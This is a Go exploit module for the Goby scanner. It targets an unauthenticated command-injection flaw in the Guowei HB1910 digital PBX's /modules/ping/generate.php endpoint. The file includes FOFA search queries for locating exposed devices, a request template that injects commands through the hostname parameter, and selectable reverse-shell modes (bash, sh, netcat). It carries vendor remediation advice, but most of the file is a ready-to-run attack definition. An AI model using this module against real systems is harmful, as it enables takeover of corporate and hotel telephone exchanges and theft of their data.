package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "Guowei HB1910 digital program-controlled telephone exchange /modules/ping/generate.php Command Execution Vulnerability",
    "Description": "<p>Guowei HB1910 Digital PBX is a powerful communication device widely used in corporate offices, hotel front desks, and monitoring management centers. The generate.php interface of this device has a remote command execution vulnerability. Unauthenticated attackers can exploit this interface to send malicious requests, execute arbitrary commands, and even write webshell backdoor files, thereby gaining server privileges. This may lead to sensitive information leakage, complete system control, and other serious consequences.</p>",
    "Product": "Guowei HB1910 Digital PBX",
    "Homepage": "http://www.hb-voice.com/gw/hb1910.html",
    "DisclosureDate": "2024-12-15",
    "PostTime": "2024-12-17",
    "Author": "1251220046@qq.com",
    "FofaQuery": "body=\"themes/tenant/css/login.css\" && body=\"深圳国威电子有限公司\"",
    "GobyQuery": "body=\"themes/tenant/css/login.css\" && body=\"深圳国威电子有限公司\"",
    "Level": "3",
    "Impact": "<p>This vulnerability allows unauthenticated attackers to remotely execute arbitrary commands, potentially leading to complete server control, sensitive information leakage, and business interruption.</p>",
    "Recommendation": "<p>1. Monitor the vendor's official website for updates: <a href=\"http://www.hb-voice.com/gw/hb1910.html.2.\">http://www.hb-voice.com/gw/hb1910.html.</a></p><p>2. Use firewalls or other security devices to set access policies and whitelist access.</p><p>3. Disable public Internet access to this system and close exposed interfaces.</p>",
    "References": [
        "https://axsec.blog.csdn.net/article/details/144485024?spm=1001.2014.3001.5502"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "Mode",
            "type": "select",
            "value": "Command,Reverse",
            "show": ""
        },
        {
            "name": "Command",
            "type": "input",
            "value": "whoami",
            "show": "Mode=Command"
        },
        {
            "name": "Reverse",
            "type": "select",
            "value": "ByBashBase64,ByBash,BySh,ByNcBsd",
            "show": "Mode=Reverse"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/modules/ping/generate.php?send=Ping&hostname=;{{{COMMAND}}}",
                "follow_redirect": true,
                "header": {
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0",
                    "Accept": "*/*",
                    "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
                    "Accept-Encoding": "gzip, deflate, br",
                    "Connection": "keep-alive"
                },
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Command Execution"
    ],
    "VulType": [
        "Command Execution"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "9.2",
    "Translation": {
        "CN": {
            "Name": "国威HB1910数字程控电话交换机 /modules/ping/generate.php 命令执行漏洞",
            "Product": "国威HB1910数字程控电话交换机",
            "Description": "<p>国威HB1910数字程控电话交换机是一款功能强大的通信设备，广泛应用于企业办公、酒店前台和监控管理中心等场合。其 generate.php 接口存在远程命令执行漏洞，未经身份验证的攻击者可以通过该接口发送恶意请求，执行任意命令，甚至写入webshell后门文件，从而获取服务器权限，可能导致敏感信息泄露、系统被完全控制等严重后果。</p>",
            "Recommendation": "<p>1. 关注厂商官网，及时关注更新信息：<a href=\"http://www.hb-voice.com/gw/hb1910.html\">http://www.hb-voice.com/gw/hb1910.html</a>。</p><p>2. 通过防火墙等安全设备设置访问策略，设置白名单访问。</p><p>3. 禁止公网访问该系统，关闭暴露在互联网的相关接口。</p>",
            "Impact": "<p>攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个服务器，导致敏感信息泄露、系统被完全控制以及业务中断等严重后果。</p>",
            "VulType": [
                "命令执行"
            ],
            "Tags": [
                "命令执行"
            ]
        },
        "EN": {
            "Name": "Guowei HB1910 digital program-controlled telephone exchange /modules/ping/generate.php Command Execution Vulnerability",
            "Product": "Guowei HB1910 Digital PBX",
            "Description": "<p>Guowei HB1910 Digital PBX is a powerful communication device widely used in corporate offices, hotel front desks, and monitoring management centers. The generate.php interface of this device has a remote command execution vulnerability. Unauthenticated attackers can exploit this interface to send malicious requests, execute arbitrary commands, and even write webshell backdoor files, thereby gaining server privileges. This may lead to sensitive information leakage, complete system control, and other serious consequences.</p>",
            "Recommendation": "<p>1. Monitor the vendor's official website for updates: <a href=\"http://www.hb-voice.com/gw/hb1910.html.2.\">http://www.hb-voice.com/gw/hb1910.html.</a></p><p>2. Use firewalls or other security devices to set access policies and whitelist access.</p><p>3. Disable public Internet access to this system and close exposed interfaces.</p>",
            "Impact": "<p>This vulnerability allows unauthenticated attackers to remotely execute arbitrary commands, potentially leading to complete server control, sensitive information leakage, and business interruption.</p>",
            "VulType": [
                "Command Execution"
            ],
            "Tags": [
                "Command Execution"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Variables": {
        "TEMPLATE": "define|variable|CommandExecEcho",
        "COMMAND": "define|query_encode|COMMAND",
        "VUL_URL": "define|variable|/modules/ping/generate.php"
    },
    "VariablesOrder": [
        "TEMPLATE",
        "COMMAND",
        "VUL_URL"
    ],
    "EditType": "fast",
    "PocId": "9978"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}